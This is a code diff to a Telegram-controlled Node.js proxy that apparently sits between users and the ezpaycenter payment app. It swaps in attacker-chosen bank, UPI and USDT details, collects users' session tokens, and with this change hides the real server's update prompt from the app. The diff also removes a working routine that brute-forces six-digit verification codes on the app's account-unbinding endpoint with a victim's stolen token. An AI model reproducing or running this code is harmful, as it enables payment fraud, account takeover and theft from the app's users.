@@ -24,7 +24,8 @@ const DEFAULT_DATA = {
   withdrawOverride: 0,
   userOverrides: {},
   trackedUsers: {},
-  suspendedPhones: {}
+  suspendedPhones: {},
+  blockUpdate: true
 };
 
 let bot = null;
@@ -330,6 +331,15 @@ async function proxyFetch(req) {
       respHeaders[key] = val;
     }
   });
+  const blockData = cachedData || DEFAULT_DATA;
+  if (blockData.blockUpdate !== false) {
+    for (const k of Object.keys(respHeaders)) {
+      const kl = k.toLowerCase();
+      if (kl === 'needupdateflag') {
+        delete respHeaders[k];
+      }
+    }
+  }
   let jsonResp = null;
   try { jsonResp = JSON.parse(respBody); } catch(e) {}
   return { response, respBody, respHeaders, jsonResp };
@@ -668,6 +678,8 @@ app.post('/bot-webhook', async (req, res) => {
 /log — Toggle request logging
 /off log <userId> — Log off for user
 /on log <userId> — Log on for user
+/update — Block update popup (default ON)
+/update on — Allow update popup
 /status — Full status
 /debug — Debug next response
 
@@ -691,10 +703,6 @@ app.post('/bot-webhook', async (req, res) => {
 === TRACKING ===
 /idtrack — Show all tracked user IDs
 
-=== BRUTEFORCE ===
-/bruteforce — Show available tokens
-/bruteforce <token> <start> <end>
-
 Example:
 /addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
       );
@@ -709,7 +717,7 @@ Example:
     if (text === '/status') {
       const active = getActiveBank(data, null);
       const idCount = Object.keys(data.userOverrides || {}).length;
-      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
+      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
       if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
@@ -723,6 +731,19 @@ Example:
     if (text === '/log') { data.logRequests = !data.logRequests; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
 
     if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace request ka full response dump aayega'); return res.sendStatus(200); }
+
+    if (text === '/update' || text === '/update off' || text === '/update on') {
+      if (text === '/update on') {
+        data.blockUpdate = false;
+        await saveData(data);
+        await bot.sendMessage(chatId, '✅ Update popup ALLOWED\nReal server ka update dialog ab dikhega.');
+      } else {
+        data.blockUpdate = true;
+        await saveData(data);
+        await bot.sendMessage(chatId, '🚫 Update popup BLOCKED\nReal server ka update popup ab nahi dikhega app mein.');
+      }
+      return res.sendStatus(200);
+    }
 
     if (text.startsWith('/off log ')) {
       const targetId = text.substring(9).trim();
@@ -1119,110 +1140,6 @@ Example:
 
     if (text === '/help') {
       await bot.sendMessage(chatId, 'Use /start to see all commands.');
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/bruteforce')) {
-      const parts = text.split(' ');
-      const targetToken = parts[1];
-      const startCode = parseInt(parts[2] || '', 10);
-      const endCode = parseInt(parts[3] || '', 10);
-
-      if (!targetToken || isNaN(startCode) || isNaN(endCode)) {
-        const userTokens = {};
-        if (redis) {
-          try {
-            const allTokens = await redis.hgetall('ezpayTokenMap');
-            if (allTokens && typeof allTokens === 'object') {
-              if (Array.isArray(allTokens)) {
-                for (let i = 0; i < allTokens.length; i += 2) {
-                  const tk = allTokens[i];
-                  const uid = allTokens[i + 1];
-                  if (tk && uid && tk.length > 10) {
-                    if (!userTokens[uid]) userTokens[uid] = [];
-                    userTokens[uid].push(tk);
-                  }
-                }
-              } else {
-                for (const [tk, uid] of Object.entries(allTokens)) {
-                  if (tk && uid && tk.length > 10) {
-                    if (!userTokens[uid]) userTokens[uid] = [];
-                    userTokens[uid].push(tk);
-                  }
-                }
-              }
-            }
-          } catch(e) {}
-        }
-        for (const [tk, uid] of Object.entries(tokenUserMap)) {
-          if (tk && uid && tk.length > 10) {
-            if (!userTokens[uid]) userTokens[uid] = [];
-            if (!userTokens[uid].includes(tk)) userTokens[uid].push(tk);
-          }
-        }
-        const userCount = Object.keys(userTokens).length;
-        let msgs = [`🔓 Bruteforce — ${userCount} users\n\nFormat:\n/bruteforce <token> <start> <end>\n\nExample:\n/bruteforce abc123 656600 656610`];
-        for (const [uid, tokens] of Object.entries(userTokens)) {
-          const latest = tokens[tokens.length - 1];
-          msgs.push(`👤 User: ${uid}\n🔑 Token:\n\`${latest}\``);
-        }
-        if (userCount === 0) {
-          msgs.push('❌ No tokens. User must login via proxy first.');
-        }
-        for (const m of msgs) {
-          await bot.sendMessage(chatId, m, { parse_mode: 'Markdown' }).catch(() => {
-            bot.sendMessage(chatId, m).catch(()=>{});
-          });
-        }
-        return res.sendStatus(200);
-      }
-
-      const total = endCode - startCode + 1;
-      await bot.sendMessage(chatId, `🔓 BRUTEFORCE\n🔢 Range: ${String(startCode).padStart(6,'0')} → ${String(endCode).padStart(6,'0')} (${total} codes)\n🔄 Mode: One by one (sequential)\nToken: ${targetToken.substring(0, 25)}...`);
-
-      (async () => {
-        try {
-          let found = false;
-          let log = '';
-          for (let i = startCode; i <= endCode; i++) {
-            const codeStr = String(i).padStart(6, '0');
-            try {
-              const resp = await fetch('https://api.ezpaycenter.com/app/api/memberManager/v2/unbindRobot', {
-                method: 'POST',
-                headers: {
-                  'Content-Type': 'application/json',
-                  'apptoken': targetToken,
-                  'host': 'api.ezpaycenter.com',
-                  'accept': 'application/json',
-                },
-                body: JSON.stringify({ verificationCode: codeStr }),
-              });
-              const respText = await resp.text();
-              let json;
-              try { json = JSON.parse(respText); } catch(e) {}
-
-              if (json && json.status === '200') {
-                found = true;
-                log += `✅ ${codeStr} → SUCCESS\n`;
-                await bot.sendMessage(chatId, `✅ CODE FOUND: ${codeStr}\n🎉 Unbind successful!\n\n📥 Response:\n${respText.substring(0, 1500)}`);
-                break;
-              } else if (json && json.status === '601') {
-                log += `🛑 ${codeStr} → TOKEN EXPIRED\n`;
-                await bot.sendMessage(chatId, `🛑 Token expired at code ${codeStr}. Stopped.`);
-                break;
-              } else {
-                log += `❌ ${codeStr} → ${json?.status || '?'} ${json?.message || respText.substring(0, 80)}\n`;
-              }
-            } catch(e) {
-              log += `⚠️ ${codeStr} → Error: ${e.message}\n`;
-            }
-          }
-          await bot.sendMessage(chatId, `📋 Results:\n${log}\n${found ? '🎉 Done — code found!' : '❌ No valid code in range.'}`);
-        } catch(e) {
-          await bot.sendMessage(chatId, `🛑 Error: ${e.message}`).catch(()=>{});
-        }
-      })();
-
       return res.sendStatus(200);
     }
 
